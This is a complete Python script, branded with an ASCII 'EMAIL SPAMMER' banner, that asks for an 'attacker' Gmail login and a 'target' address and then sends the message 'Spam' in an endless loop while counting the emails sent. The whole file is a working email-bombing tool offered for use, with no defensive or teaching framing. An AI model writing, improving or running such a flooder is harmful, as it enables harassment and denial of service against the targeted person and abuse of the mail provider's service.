import smtplib
import os

emails_sendet=0

print("             Welcome to")
print("")
print("      ___ __  __   _   ___ _   ")
print("     | __|  \/  | /_\ |_ _| |    ")
print("     | _|| |\/| |/ _ \ | || |__   ")
print("     |___|_|_ |_/_/_\_\___|____| ")
print(" ")
print("  ___ ___  _   __  __ __  __ ___ ___  ")
print(" / __| _ \/_\ |  \/  |  \/  | __| _ \ ")
print(" \__ \  _/ _ \| |\/| | |\/| | _||   / ")
print(" |___/_|/_/ \_\_|  |_|_|  |_|___|_|_\ ")
print("")
email = input("| Attacker Email: ")# Your email
print("[+] Email added")
password = input("| Attacker Email Password: ") # Your email account password
print("[+] Password added")
send_to_email = input("| Add Target Email: ") # Who you are sending the message to
print("[+] Target Set = " + send_to_email)
message = 'Spam' # The message in the email
server = smtplib.SMTP('smtp.gmail.com', 587) # Connect to the server
print("[+] Connected to SMTP Server")
server.starttls() # Use TLS
print("[+] Use TLS")
server.login(email, password) # Login to the email server
print("| To stop the Process type 'ctrl + c'")
print("| Type Enter To start")
input()
print("[+] attack started")
while True:
    server.sendmail(email, send_to_email , message) # Send the email
    os.system('clear')
    emails_sendet  += 1
    print("[+] Email's Sendet: " + str(emails_sendet))

server.quit() # Logout of the email server
os.system('clear')
